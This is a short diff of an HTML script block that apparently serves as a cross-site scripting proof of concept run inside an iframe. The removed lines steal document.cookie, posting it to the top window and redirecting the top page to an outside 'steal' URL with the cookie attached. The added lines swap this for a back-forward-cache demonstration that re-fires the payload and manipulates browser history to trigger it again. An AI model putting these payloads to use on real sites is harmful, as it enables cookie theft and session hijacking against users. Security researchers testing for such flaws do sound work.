@@ -1,15 +1,17 @@
 <script>
-  // Tenta enviar dados via postMessage
-window.top.postMessage("Exfil: " + document.cookie, "*");
+// Detect when coming back from bfcache
+window.addEventListener("pageshow", (event) => {
+  if (event.persisted) {
+    alert("BFCache Restored — Payload Executed Again!");
+    window.top.postMessage("BFCache PoC Triggered", "*");
+  }
+});
 
-// Tenta forçar redirecionamento da página principal
-try {
-    window.top.location = "https://pedrojuniorrd.github.io/steal?cookie=" + encodeURIComponent(document.cookie);
-} catch (e) {
-    console.log("Navigation blocked by CSP or sandbox.");
-}
+// Trigger initial payload
+alert("Initial Payload Execution");
+window.top.postMessage("Initial PoC Triggered", "*");
 
-// Tenta disparar um XSS visual dentro do próprio iframe (se for o caso)
-alert("Payload Executed!");
-
+// Manipulate History to help exploitation
+history.pushState({}, "", "/stealth");
+setTimeout(() => history.back(), 3000);  // Automatically trigger back after 3 seconds
 </script>
